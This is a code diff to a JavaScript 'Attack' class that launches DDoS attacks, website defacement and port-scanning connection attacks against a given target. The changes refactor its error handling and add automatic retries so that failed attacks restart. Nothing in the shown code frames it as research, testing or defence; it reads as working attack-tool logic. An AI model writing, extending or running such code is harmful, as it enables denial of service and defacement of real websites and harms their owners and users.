@@ -10,11 +10,14 @@ class Attack {
       packetsSent: 0,
       status: 'Idle',
       timeElapsed: 0,
-      errors: 0
+      errors: 0,
+      lastError: null
     };
     this.intervalId = null;
     this.attackInstance = null;
-    this.errorThreshold = 10;
+    this.errorThreshold = 5;
+    this.maxRetries = 3;
+    this.currentRetry = 0;
   }
 
   async start() {
@@ -24,29 +27,37 @@ class Attack {
     this.startTime = Date.now();
     this.stats.status = 'Starting';
     this.stats.errors = 0;
+    this.currentRetry = 0;
 
+    await this.executeWithRetry();
+
+    this.intervalId = setInterval(() => {
+      this.updateStats();
+    }, 1000);
+  }
+
+  async executeWithRetry() {
     try {
-      switch (this.type) {
-        case 'ddos':
-          await this.executeDDoSAttack();
-          break;
-        case 'defacement':
-          await this.executeDefacement();
-          break;
-        case 'connection':
-          await this.executeConnectionAttack();
-          break;
-        default:
-          throw new Error(`Unknown attack type: ${this.type}`);
-      }
-
-      this.intervalId = setInterval(() => {
-        this.updateStats();
-      }, 1000);
+      await this.executeAttack();
     } catch (error) {
-      console.error('Attack failed to start:', error);
-      this.stats.status = 'Failed to start';
-      this.stop();
+      console.error('Attack failed:', error);
+      this.handleAttackError(error);
+    }
+  }
+
+  async executeAttack() {
+    switch (this.type) {
+      case 'ddos':
+        await this.executeDDoSAttack();
+        break;
+      case 'defacement':
+        await this.executeDefacement();
+        break;
+      case 'connection':
+        await this.executeConnectionAttack();
+        break;
+      default:
+        throw new Error(`Unknown attack type: ${this.type}`);
     }
   }
 
@@ -69,12 +80,17 @@ class Attack {
       throw new Error('DDoS type not specified.');
     }
 
-    const ddosModule = await import(`./ddos/${ddosType}.js`);
-    this.ddosAttack = new ddosModule.default(this.target, this.options);
-    this.attackInstance = this.ddosAttack;
+    try {
+      const ddosModule = await import(`./ddos/${ddosType}.js`);
+      this.ddosAttack = new ddosModule.default(this.target, this.options);
+      this.attackInstance = this.ddosAttack;
 
-    this.stats.status = 'DDoSing';
-    await this.ddosAttack.start();
+      this.stats.status = 'DDoSing';
+      await this.ddosAttack.start();
+    } catch (error) {
+      console.error(`Failed to load or start DDoS attack: ${error}`);
+      this.handleAttackError(error);
+    }
   }
 
   async executeDefacement() {
@@ -83,6 +99,7 @@ class Attack {
       const response = await fetch(this.target, { mode: 'cors' });
       if (!response.ok) {
         this.stats.status = 'Unresponsive';
+        this.handleAttackError(new Error(`Target unresponsive: ${response.status}`));
         return;
       }
       let html = await response.text();
@@ -103,7 +120,7 @@ class Attack {
       }
       this.stats.status = 'Submitting Defacement';
 
-      await fetch('/defacement', {
+      const submitResponse = await fetch('/defacement', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
@@ -114,14 +131,14 @@ class Attack {
         })
       });
 
+      if (!submitResponse.ok) {
+        throw new Error(`Defacement submission failed: ${submitResponse.status}`);
+      }
+
       this.stats.status = 'Defaced';
     } catch (error) {
       console.error('Defacement failed:', error);
-      this.stats.status = 'Failed';
-      this.stats.errors++;
-      if (this.stats.errors > this.errorThreshold) {
-        this.stop();
-      }
+      this.handleAttackError(error);
     }
   }
 
@@ -148,11 +165,8 @@ class Attack {
         }
       } catch (error) {
         console.error(`Error scanning port ${port}:`, error);
-        this.stats.errors++;
-        if (this.stats.errors > this.errorThreshold) {
-          this.stop();
-          break;
-        }
+        this.handleAttackError(error);
+        if (!this.isRunning) break;
       }
     }
 
@@ -170,13 +184,29 @@ class Attack {
       .then(response => {
         this.stats.status = response.ok ? 'Online' : 'Unresponsive';
       })
-      .catch(() => {
+      .catch((error) => {
         this.stats.status = 'Offline';
-        this.stats.errors++;
-        if (this.stats.errors > this.errorThreshold) {
-          this.stop();
-        }
+        this.handleAttackError(error);
       });
+  }
+
+  handleAttackError(error) {
+    this.stats.errors++;
+    this.stats.lastError = error.message || 'Unknown error';
+
+    if (this.stats.errors > this.errorThreshold) {
+      if (this.currentRetry < this.maxRetries) {
+        this.currentRetry++;
+        console.log(`Retrying attack (attempt ${this.currentRetry}/${this.maxRetries})...`);
+        this.stats.errors = 0;
+        this.stats.lastError = null;
+        this.executeWithRetry();
+      } else {
+        console.error('Max retries reached. Stopping attack.');
+        this.stats.status = 'Failed';
+        this.stop();
+      }
+    }
   }
 
   getStats() {
